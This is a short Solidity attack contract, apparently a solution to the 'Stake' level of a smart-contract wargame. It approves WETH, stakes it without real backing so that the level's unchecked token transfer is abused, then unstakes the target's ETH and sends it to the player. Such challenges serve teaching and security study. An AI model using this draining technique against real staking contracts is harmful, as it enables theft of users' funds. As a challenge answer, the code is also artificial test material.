// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../levels/Stake.sol';

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
contract StakeAttack {

  function attack(address _target, address _player) public {
    Stake stake = Stake(_target);
    bool s = IERC20(stake.WETH()).approve(_target, 1 ether);
    require(s);
    stake.StakeWETH(1000000000000001);
    stake.Unstake(address(stake).balance);
    (bool success,) = _player.call{value: address(this).balance}("");
    require(success);
  }
}